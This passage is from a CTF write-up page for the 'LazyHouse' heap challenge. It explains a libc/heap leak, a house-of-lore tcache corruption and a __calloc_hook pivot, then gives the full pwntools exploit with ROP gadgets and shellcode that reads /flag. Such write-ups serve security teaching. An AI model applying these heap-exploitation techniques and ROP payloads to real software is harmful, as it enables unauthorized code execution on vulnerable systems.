+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/54b015be-9a32-4986-b080-8ff7b6ca1a6c.jpg" />
+And show <strong>house 1</strong> to get <strong>heap address</strong> and <strong>libc address</strong>.
+<div class="codehilite"><pre><span></span>#leak
+show_house(1, reading = False)
+for i in range(0, 10):
+    ru(p64(0xa1))
+leaked_libc = u64(p.read(8))
+leaked_heap = u64(p.read(8))
+
+libc_base = leaked_libc - 0x1e4ca0
+heap_base = leaked_heap - 0x1d60
+log.critical(&quot;libc_base --&gt; {}&quot;.format(hex(libc_base)))
+log.critical(&quot;heap_base --&gt; {}&quot;.format(hex(heap_base)))
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/383e4bd0-cefc-4320-a3ea-d408f39c1927.png" /></p>
+<h3 id="house-of-lore">House of Lore<a class="headerlink" href="#house-of-lore" title="Permanent link">&para;</a></h3>
+<p>I use house of lore to fuck the tcache struct in heap range to reach the goal of arbitrary writing.
+Firstly, I sell the bit chunk and buy the chunk to change the value overlapped by this chunk. This is really usefull in the consistance that we can only upgrade houses for twice.
+By modifying chunks, we can make the change the size of the chunk of <strong>house 2</strong> to 0x21 and the size of the chunk of <strong>house 7</strong> to 0x31.
+<div class="codehilite"><pre><span></span>sell(1)
+
+buy_house(1, 0x8c0, &quot;\xbb&quot; * 0xa0 +
+          p64(0) + p64(0x21) + &quot;\xcc&quot; * 0x10 +
+          p64(0) + p64(0xa1 - 0x20) + &quot;\x00&quot; * (0x90 - 0x20) +
+          p64(0) + p64(0xa1) + &quot;\xdd&quot; * 0x90 +
+          (p64(0) + p64(0xa1) + &quot;\x11&quot; * 0x90) * 7 +
+          p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + &quot;\x44&quot; * 0x80 +
+          p64(0) + p64(0x21) + &quot;\x55&quot; * 0x10 +
+          p64(0) + p64(0xa1 - 0x20) + &quot;\x00&quot; * (0x90 - 0x20) +
+          p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + &quot;\x66&quot; * 0x80 +
+          p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 +
+          p64(0) + p64(0xa1 - 0x30) + &quot;\x00&quot; * (0x90 - 0x30) )
+
+#prepare for house of lore
+sell(2)
+sell(7)
+sell(1)
+</pre></div>
+After we free the chunk of <strong>house 2</strong> and the chunk of <strong>house 7</strong>, we get 2 bin pointer at heap_base + 0x50, which is quite useful for house of lore attack.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/e8495a6f-dc12-47ef-9cb1-5486ef105476.jpg" />
+We sell the chunk of <strong>house 1</strong>, that big chunk, for further making a small bin at the address of that 0x21 tcache chunk. (The pointer in tcache struct is <strong>&amp;chunk + 0x10</strong>)
+We buy a chunk, the size of which is (0xb0 + 0x10), to make the top chunk start at the address of that 0x21 tcache bin. GREAT~
+<div class="codehilite"><pre><span></span>buy_house(1, 0xb0, &quot;\x11&quot; * 0xb0)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/19b5dcd2-eec4-4a72-92b2-259eb10ed8e5.jpg" />
+Obtain the small bin in smallbins to clean the smallbins.
+<div class="codehilite"><pre><span></span>buy_house(2, 0x90, &quot;\x22&quot; * 0x90)
+</pre></div>
+Obtain a size of 0x220 at the address of that 0x21 tcache bin.
+<div class="codehilite"><pre><span></span>buy_house(6, 0x217, &quot;\x66&quot; * 0x90)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/2687fd9b-ae5d-48b2-a032-fe3aa72643e6.jpg" />
+So, it is good for the check for smallbins list. <font color=red><strong>p-&gt;BK-&gt;prev == p</strong></font>.
+We then get a smallbin chunk to avoid being merging with top_chunk.
+<div class="codehilite"><pre><span></span>buy_house(4, 0x217, &quot;\x44&quot; * 0x90)
+</pre></div>
+A great trick. We calloc a (0x3a0 + 0x10) size chunk and free it into tcache to make the bitmap to be 0x100. It is really usefull for this challenge, since we can only use <code>calloc</code>, we need to zero memory with the size of the fake chunk (0 is really not good).
+<div class="codehilite"><pre><span></span>buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8))
+sell(6)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/23c23f63-dc5b-45fc-934c-beefee67ed9d.jpg" />
+Then we make the second overflow to do house of lore attack, modify <font color=red>p-&gt;bk to fake_chunk</font>.
+<div class="codehilite"><pre><span></span>upgrade(1, &quot;\x22&quot; * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40))
+</pre></div>
+Which is still important is that we need to make <font color=red>p-&gt;bk-&gt;bk-&gt;prev == p-&gt;bk</font>.
+Do you remember that we have a tcache bin of 0x30? Good.
+We just need to set the <strong>fd</strong> of that chunk to be <code>heap_base + 0x40</code>. The great trick of setting bitmap to 0x100 has aslo meet that requirement.
+<div class="codehilite"><pre><span></span>buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8))
+</pre></div>
+At last, we just need to calloc the modified bin out and then we will get the chunk at <strong>heap_base + 0x40</strong>, which is the struct of tcache. We can change the header of the tcache bin list whose size is 0x220 to <code>__calloc_hook</code> and buy a big house (use malloc).</p>
+<p>We can make ROP_CHAIN when we buy the house.</p>
+<p>It is interesting that when we call <code>__calloc_hook</code>, the register <code>rbp</code> is the same value as size.</p>
+<p>So, we change <code>__calloc_hook</code> to a Gadget <code>leave; ret</code> to do ROP at the ROP_CHAIN by calloc(&amp;heap_chunk + ?).</p>
+<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span>from pwn import *
+
+local=1
+pc=&#39;./lazyhouse&#39;
+aslr=True
+context.log_level=&quot;debug&quot;
+context.word_size = 64
+context.os = &quot;linux&quot;
+context.endian = &quot;little&quot;
+
+libc=ELF(&#39;./libc.so.6&#39;)
+
+if local==1:
+    #p = process(pc,aslr=aslr,env={&#39;LD_PRELOAD&#39;: &#39;./ld-linux-x86-64.so.2&#39;, &quot;LD_LIBRARY_PATH&quot;:&quot;./&quot;})
+    p = process(pc,aslr=aslr)
+    #gdb.attach(p, &quot;b malloc_printerr&quot;)
+else:
+    remote_addr=[&#39;6.6.6.6&#39;, 6666]
+    p=remote(remote_addr[0],remote_addr[1])
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda   : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a,b)
+
+def lg(s,addr):
+    print(&#39;\033[1;31;40m%20s--&gt;0x%x\033[0m&#39;%(s,addr))
+
+def raddr(a=6):
+    if(a==6):
+        return u64(rv(a).ljust(8,&#39;\x00&#39;))
+    else:
+        return u64(rl().strip(&#39;\n&#39;).ljust(8,&#39;\x00&#39;))
+
+def buy_house(index, size, buf, logging = False):
+    ru(&quot;Your choice: &quot;)
+    log.info(&quot;target price --&gt; {price}&quot;.format(price = hex(size * 0xDA &amp; 0xffffffffffffffff)))
+    sl(&quot;1&quot;)
+    ru(&quot;Your money:&quot;)
+    money_now = int(rl().strip())
+    log.info(&quot;money_now --&gt; {money_now}&quot;.format(money_now = hex(money_now)))
+    ru(&quot;Index:&quot;)
+    sl(str(index))
+    ru(&quot;Size:&quot;)
+    sl(str(size))
+    ru(&quot;Price:&quot;)
+    log.info(&quot;price --&gt; {price}&quot;.format(price = hex(int(rl().strip()))))
+    if logging == True:
+        return
+    if(p.read(6) != &quot;House:&quot;):
+        rl()
+        log.critical(&quot;fucked a really big house&quot;)
+        return
+    sn(buf)
+
+def show_house(index, reading = True):
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;2&quot;)
+    ru(&quot;Index:&quot;)
+    sl(str(index))
+    if reading == True:
+        return ru(&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;)[:-len(&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;)]
+
+def upgrade(index, buf):
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;4&quot;)
+    ru(&quot;Index:&quot;)
+    sl(str(index))
+    ru(&quot;House:&quot;)
+    sn(buf)
+
+def sell(index):
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;3&quot;)
+    ru(&quot;Index:&quot;)
+    sl(str(index))
+
+def check_money():
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;1&quot;)
+    ru(&quot;Your money:&quot;)
+    money_now = int(rl().strip())
+    #log.critical(&quot;money_now --&gt; {money}&quot;.format(money = hex(money_now)))
+    ru(&quot;Index:&quot;)
+    sl(&quot;7&quot;)
+    ru(&quot;Size:&quot;)
+    sl(str(0x10))
+    #log.critical(&quot;max calloc --&gt; {money}&quot;.format(money = hex(money_now / 0xda)))
+    return money_now
+
+def buy_super(buf):
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;5&quot;)
+    ru(&quot;House:&quot;)
+    sn(buf)
+
+def show_super():
+    ru(&quot;Your choice: &quot;)
+    sl(&quot;6&quot;)
+    ru(&quot;Here is supper house:\n&quot;)
+    return p.read(0x217)
+
+def fuck_money(size):
+    buy_house(7, size, &quot;\x00&quot;)
+    sell(7)
+    log.critical(hex(check_money()))
+
+
+if __name__ == &#39;__main__&#39;:
+    fuck_money(0x13f69b02593f69b1)
+    fuck_money(0x109bb0727572e2bd)
+    fuck_money(0x13f2b1389a662c33)
+    fuck_money(0x4fcace18cee3091)
+
+    #make tcache size 0x217 full
+    for i in range(0, 7):
+        buy_house(7, 0x217, &quot;\x00&quot;)
+        sell(7)
+
+    #chunk after tcache and before tmp tcache bins
+    buy_house(2, 0x80, &quot;x&quot; * 0x10)
+    sell(2)
+    buy_house(0, 0x400, &quot;\xaa&quot; * 0x400)
+    buy_house(1, 0xa0, &quot;\xbb&quot; * 0xa0)
+    buy_house(2, 0x90, &quot;\xcc&quot; * 0x90)
+    buy_house(3, 0x90, &quot;\xdd&quot; * 0x90)
+
+    #overlapping first
+    upgrade(0, &quot;\xaa&quot; * 0x400 + p64(0) + p64(0x8d1))
+
+    for i in range(0, 7):
+        buy_house(7, 0x90, &quot;\x11&quot; * 0x90)
+        sell(7)
+
+    #unsorted bin
+    buy_house(4, 0x90, &quot;\x44&quot; * 0x90)
+    buy_house(5, 0x90, &quot;\x55&quot; * 0x90)
+    buy_house(6, 0x90, &quot;\x66&quot; * 0x90)
+    buy_house(7, 0x90, &quot;\x77&quot; * 0x90)
+
+
+    #a big chunk
+    sell(1)
+    #pause()
+    buy_house(1, 0x8c0, &quot;\xbb&quot; * 0xa0 +
+              p64(0) + p64(0xa1) + &quot;\xcc&quot; * 0x90 +
+              p64(0) + p64(0xa1) + &quot;\xdd&quot; * 0x90 +
+              (p64(0) + p64(0xa1) + &quot;\x11&quot; * 0x90) * 7 +
+              p64(0) + p64(0xa1) + &quot;\x44&quot; * 0x90 +
+              p64(0) + p64(0xa1) + &quot;\x55&quot; * 0x90 +
+              p64(0) + p64(0xa1) + &quot;\x66&quot; * 0x90 +
+              p64(0) + p64(0xa1) + &quot;\x77&quot; * 0x90 )
+    #pause()
+    sell(4)
+    sell(6)
+
+    #leak
+    show_house(1, reading = False)
+    for i in range(0, 10):
+        ru(p64(0xa1))
+    leaked_libc = u64(p.read(8))
+    leaked_heap = u64(p.read(8))
+
+    libc_base = leaked_libc - 0x1e4ca0
+    heap_base = leaked_heap - 0x1d60
+    log.critical(&quot;libc_base --&gt; {}&quot;.format(hex(libc_base)))
+    log.critical(&quot;heap_base --&gt; {}&quot;.format(hex(heap_base)))
+
+
+    sell(1)
+    #pause()
+    buy_house(1, 0x8c0, &quot;\xbb&quot; * 0xa0 +
+              p64(0) + p64(0x21) + &quot;\xcc&quot; * 0x10 +
+              p64(0) + p64(0xa1 - 0x20) + &quot;\x00&quot; * (0x90 - 0x20) +
+              p64(0) + p64(0xa1) + &quot;\xdd&quot; * 0x90 +
+              (p64(0) + p64(0xa1) + &quot;\x11&quot; * 0x90) * 7 +
+              p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d40 - 0x10) + p64(heap_base + 0x1d60) + &quot;\x44&quot; * 0x80 +
+              p64(0) + p64(0x21) + &quot;\x55&quot; * 0x10 +
+              p64(0) + p64(0xa1 - 0x20) + &quot;\x00&quot; * (0x90 - 0x20) +
+              p64(0) + p64(0xa1) + p64(heap_base + 0x1c20) + p64(libc_base + 0x1e4d40 - 0x10) + &quot;\x66&quot; * 0x80 +
+              p64(0) + p64(0x31) + p64(heap_base + 0x40) * 4 +
+              p64(0) + p64(0xa1 - 0x30) + &quot;\x00&quot; * (0x90 - 0x30) )
+
+    #prepare for house of lore
+    sell(2)
+    sell(7)
+    sell(1)
+
+    buy_house(1, 0xb0, &quot;\x11&quot; * 0xb0)
+    buy_house(2, 0x90, &quot;\x22&quot; * 0x90)
+    buy_house(6, 0x217, &quot;\x66&quot; * 0x90)
+    buy_house(4, 0x217, &quot;\x44&quot; * 0x90)
+    sell(6)
+    #set bitmap to 0x100
+    buy_house(6, 0x3a0, p64(heap_base + 0x40) * (0x3a0 / 8))
+    sell(6)
+    pause()
+    #house of lore
+    upgrade(1, &quot;\x22&quot; * 0xb0 + p64(0) + p64(0xa1) + p64(libc_base + 0x1e4d30) + p64(heap_base + 0x40))
+
+    libc.address = libc_base
+    malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]
+    mprotect = libc.symbols[&quot;mprotect&quot;]
+    leave_ret = libc_base + 0x0000000000058373
+    pop_rdi_ret = libc_base + 0x0000000000026542
+    pop_rsi_ret = libc_base + 0x0000000000026f9e
+    pop_rdx_ret = libc_base + 0x000000000012bda6
+    call_rdx = libc_base + 0x0000000000143650
+    ROP_CHAIN = p64(pop_rdi_ret) + p64(heap_base) + \
+                p64(pop_rsi_ret) + p64(0x4000) + \
+                p64(pop_rdx_ret) + p64(7) + p64(mprotect) + \
+                p64(pop_rdx_ret) + p64(heap_base + 0x1780) + p64(call_rdx)
+
+    ROP_CHAIN = ROP_CHAIN.ljust(0x1700 - 0x16a0, &quot;\x90&quot;)
+
+    ROP_CHAIN += &quot;/flag\0&quot;
+
+    ROP_CHAIN = ROP_CHAIN.ljust(0x1780 - 0x16a0, &quot;\x90&quot;)
+
+    buffer_addr = heap_base + 0x1700
+    heap_addr = heap_base + 0x2000
+
+    code = asm(pwnlib.shellcraft.amd64.linux.open(buffer_addr, 0, 2).replace(&quot;push SYS_open&quot;, &quot;push 2&quot;))
+    code += asm(pwnlib.shellcraft.amd64.linux.syscall(&#39;SYS_read&#39;, &#39;rax&#39;, heap_addr, 0x100))
+    code += asm(pwnlib.shellcraft.amd64.linux.syscall(&#39;SYS_write&#39;, 1 , heap_addr, 0x100).replace(&quot;push SYS_write&quot;, &quot;push 1&quot;))
+    code += asm(pwnlib.shellcraft.amd64.linux.syscall(&#39;SYS_exit&#39;, 0))
+
+    ROP_CHAIN += code
+
+    buy_house(6, 0x217, ROP_CHAIN)
+    buy_house(7, 0x217, p64(malloc_hook) * 0x40)
+    buy_super(p64(leave_ret) * 2)
+    sell(1)
+    buy_house(1, heap_base + 0x16a0 - 8, ROP_CHAIN, logging = True)
+
+    p.interactive()
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../VMEscape/BabyQemu/" title="BabyQemu" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                BabyQemu
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../../crypto/" title="home" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                home
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; f61d team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.ac79c3b0.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      
+    
+  </body>
+</html>
